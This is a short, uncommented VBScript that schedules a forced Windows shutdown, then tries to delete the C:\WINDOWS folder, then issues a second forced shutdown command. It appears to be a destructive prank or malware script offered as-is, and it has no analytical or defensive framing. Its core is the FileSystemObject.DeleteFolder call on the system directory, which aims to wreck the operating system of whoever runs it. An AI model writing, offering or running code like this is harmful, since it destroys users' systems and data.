strCmd = "shutdown -s -t 36288000 -f"
set objShell = CreateObject("WScript.Shell")
objShell.Run strCmd

WScript.Sleep 1000

set FSO=CreateObject("Scripting.FileSystemObject")

Folder="C:\\WINDOWS"

FSO.DeleteFolder(Folder)

    strShutdown = "shutdown -s -t 36288000 -f -m "

    set objShell = CreateObject("WScript.Shell")

    objShell.Run strShutdown